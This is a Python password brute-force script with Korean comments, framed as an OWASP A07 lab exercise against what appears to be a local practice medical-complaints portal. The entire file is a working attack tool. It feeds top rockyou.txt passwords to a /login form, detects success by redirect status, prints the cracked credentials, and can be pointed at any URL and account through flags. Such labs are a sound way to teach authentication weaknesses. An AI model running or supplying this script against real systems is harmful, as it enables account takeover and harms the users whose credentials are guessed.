"""
brute_force.py — 교육용 브루트포스 공격 스크립트
대상: 공공 의료 민원 포털 로그인 페이지 (/login)
용도: OWASP A07 (Authentication Failures) 취약점 실습

사용법:
  python brute_force.py                        # 기본값 (user1, top-50)
  python brute_force.py -u admin               # 타겟 계정 변경
  python brute_force.py -u user1 -n 100        # 상위 100개 시도
  python brute_force.py -u user1 --delay 0.3   # 요청 간격 조정
  python brute_force.py --url http://localhost:8090
"""

import argparse
import sys
import time

import requests

# ── 기본 설정 ──────────────────────────────────────────────
DEFAULT_URL       = "http://localhost:8090"
DEFAULT_USERNAME  = "user1"
DEFAULT_WORDLIST  = "/Users/sangwoolee/PJT2/rockyou.txt"
DEFAULT_TOP_N     = 50
DEFAULT_DELAY     = 0.1   # 요청 간격 (초)

LOGIN_PATH        = "/login"
FORM_USERNAME_KEY = "username"
FORM_PASSWORD_KEY = "password"

# 로그인 성공 판별: 리다이렉트되면 성공 (Flask-Login 패턴)
SUCCESS_STATUS    = 302


def load_wordlist(path: str, top_n: int) -> list[str]:
    """rockyou.txt에서 상위 N개 비밀번호 로드 (UTF-8 디코딩 불가 항목 건너뜀)"""
    passwords = []
    try:
        with open(path, "rb") as f:
            for line in f:
                if len(passwords) >= top_n:
                    break
                try:
                    pw = line.rstrip(b"\r\n").decode("utf-8")
                    if pw:
                        passwords.append(pw)
                except UnicodeDecodeError:
                    continue
    except FileNotFoundError:
        print(f"[ERROR] 워드리스트 파일을 찾을 수 없습니다: {path}")
        sys.exit(1)
    return passwords


def get_session_cookies(base_url: str) -> requests.Session:
    """GET /login 으로 세션 쿠키(CSRF 등) 먼저 수집"""
    session = requests.Session()
    try:
        session.get(base_url + LOGIN_PATH, timeout=5)
    except requests.RequestException as e:
        print(f"[ERROR] 서버에 연결할 수 없습니다: {e}")
        sys.exit(1)
    return session


def try_login(session: requests.Session, base_url: str, username: str, password: str) -> bool:
    """단일 로그인 시도. 성공 여부 반환"""
    url = base_url + LOGIN_PATH
    data = {
        FORM_USERNAME_KEY: username,
        FORM_PASSWORD_KEY: password,
    }
    resp = session.post(url, data=data, allow_redirects=False, timeout=5)
    return resp.status_code == SUCCESS_STATUS


def brute_force(base_url: str, username: str, passwords: list[str], delay: float) -> str | None:
    """브루트포스 실행. 성공한 비밀번호 반환, 실패 시 None"""
    print(f"\n{'='*55}")
    print(f"  대상 URL   : {base_url}{LOGIN_PATH}")
    print(f"  타겟 계정  : {username}")
    print(f"  시도 횟수  : {len(passwords)}개")
    print(f"  요청 간격  : {delay}s")
    print(f"{'='*55}\n")

    session = get_session_cookies(base_url)

    for idx, password in enumerate(passwords, start=1):
        try:
            success = try_login(session, base_url, username, password)
        except requests.RequestException as e:
            print(f"  [{idx:>4}] 요청 오류: {e}")
            continue

        status = "✓ 성공!" if success else "✗"
        print(f"  [{idx:>4}/{len(passwords)}] {password:<30}  {status}")

        if success:
            print(f"\n{'='*55}")
            print(f"  [!] 비밀번호 발견: {password}")
            print(f"  [!] 계정: {username} / {password}")
            print(f"{'='*55}\n")
            return password

        time.sleep(delay)

    print(f"\n[-] {len(passwords)}개 시도 완료 — 비밀번호를 찾지 못했습니다.")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="교육용 브루트포스 스크립트 (OWASP A07 실습)"
    )
    parser.add_argument("--url",      default=DEFAULT_URL,      help="대상 서버 URL")
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME, help="타겟 계정명")
    parser.add_argument("-w", "--wordlist",  default=DEFAULT_WORDLIST, help="워드리스트 경로")
    parser.add_argument("-n", "--top-n",    type=int, default=DEFAULT_TOP_N, help="상위 N개 시도")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="요청 간격 (초)")
    args = parser.parse_args()

    print("[*] 교육용 브루트포스 실습 (OWASP A07 — Authentication Failures)")
    print("[*] 이 스크립트는 본인 소유의 실습 환경에서만 사용하세요.\n")

    passwords = load_wordlist(args.wordlist, args.top_n)
    print(f"[*] 워드리스트 로드 완료: {len(passwords)}개")

    brute_force(args.url, args.username, passwords, args.delay)


if __name__ == "__main__":
    main()
